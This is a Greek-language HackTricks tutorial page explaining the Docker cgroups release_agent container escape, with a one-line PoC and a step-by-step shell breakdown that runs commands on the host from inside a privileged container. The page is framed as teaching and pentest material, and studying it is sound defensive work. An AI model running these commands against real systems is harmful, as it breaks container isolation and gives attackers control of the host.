# Διαφυγή cgroups Docker release\_agent

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε κόλπα χάκερ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
{% endhint %}

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) είναι μια μηχανή αναζήτησης που τροφοδοτείται από το **dark web** και προσφέρει **δωρεάν** λειτουργίες για να ελέγξετε αν μια εταιρεία ή οι πελάτες της έχουν **διαρρεύσει** από **κλέφτες κακόβουλων λογισμικών**.

Ο κύριος στόχος του WhiteIntel είναι η καταπολέμηση των αποκλεισμών λογαριασμών και των επιθέσεων ransomware που προκύπτουν από κακόβουλο λογισμικό που κλέβει πληροφορίες.

Μπορείτε να ελέγξετε τον ιστότοπό τους και να δοκιμάσετε τη μηχανή τους δωρεάν στο:

{% embed url="https://whiteintel.io" %}

***

**Για περισσότερες λεπτομέρειες, ανατρέξτε στην** [**αρχική ανάρτηση στο blog**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Αυτό είναι απλώς ένα σύνοψη:

Αρχικό PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Η απόδειξη του concept (PoC) δείχνει έναν τρόπο εκμετάλλευσης των cgroups με τη δημιουργία ενός αρχείου `release_agent` και την ενεργοποίηση της κλήσης του για να εκτελέσει αυθαίρετες εντολές στον υπολογιστή-φιλοξενία του container. Εδώ υπάρχει μια ανάλυση των βημάτων που εμπλέκονται:

1. **Προετοιμασία του Περιβάλλοντος:**
* Δημιουργείται ένας κατάλογος `/tmp/cgrp` για να λειτουργήσει ως σημείο προσάρτησης για το cgroup.
* Ο ελεγκτής cgroup RDMA προσαρτάται σε αυτόν τον κατάλογο. Σε περίπτωση απουσίας του ελεγκτή RDMA, προτείνεται η χρήση του ελεγκτή cgroup `memory` ως εναλλακτική λύση.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Δημιουργία του Παιδικού Cgroup:**
* Δημιουργείται ένα παιδικό cgroup με το όνομα "x" εντός του καταλόγου cgroup που έχει τοποθετηθεί.
* Οι ειδοποιήσεις ενεργοποιούνται για το cgroup "x" γράφοντας τον αριθμό 1 στο αρχείο notify\_on\_release του.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Διαμόρφωση του Πράκτορα Απελευθέρωσης:**
* Η διαδρομή του container στον host λαμβάνεται από το αρχείο /etc/mtab.
* Στη συνέχεια, το αρχείο release\_agent του cgroup διαμορφώνεται ώστε να εκτελέσει ένα script με το όνομα /cmd που βρίσκεται στην αποκτηθείσα διαδρομή του host.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Δημιουργία και Ρύθμιση του Σεναρίου /cmd:**
* Το σενάριο /cmd δημιουργείται μέσα στο container και ρυθμίζεται να εκτελεί την εντολή ps aux, μεταφέροντας την έξοδο σε ένα αρχείο με όνομα /output στο container. Καθορίζεται ο πλήρης διαδρομής του /output στον host.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Εκκίνηση της Επίθεσης:**
* Ένας διεργασία ξεκινάει εντός του παιδικού cgroup "x" και τερματίζεται αμέσως.
* Αυτό ενεργοποιεί το `release_agent` (το σενάριο /cmd), το οποίο εκτελεί την εντολή ps aux στον κεντρικό υπολογιστή και γράφει την έξοδο στο /output μέσα στο container.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) είναι ένας μηχανισμός αναζήτησης που τροφοδοτείται από το **dark web** και προσφέρει **δωρεάν** λειτουργίες για να ελέγξετε αν μια εταιρεία ή οι πελάτες της έχουν **διαρρεύσει** από **κλέφτες κακόβουλων λογισμικών**.

Ο κύριος στόχος του WhiteIntel είναι η καταπολέμηση των αναλήψεων λογαριασμών και των επιθέσεων ransomware που προκύπτουν από κακόβουλα λογισμικά που κλέβουν πληροφορίες.

Μπορείτε να ελέγξετε τον ιστότοπό τους και να δοκιμάσετε τον μηχανισμό τους δωρεάν στη διεύθυνση:

{% embed url="https://whiteintel.io" %}

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε κόλπα χάκινγκ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
{% endhint %}
